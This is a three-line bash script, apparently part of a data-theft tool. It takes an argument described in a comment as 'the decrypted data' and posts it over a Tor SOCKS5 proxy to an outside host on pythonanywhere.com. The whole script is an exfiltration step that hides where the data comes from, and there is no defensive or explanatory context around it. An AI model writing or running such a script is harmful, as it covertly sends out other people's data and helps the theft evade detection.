#!/bin/bash

# Assuming $1 is the decrypted data
curl --socks5 127.0.0.1:9050 -X POST -d "data=$1" https://ramraj13.pythonanywhere.com/endpoint
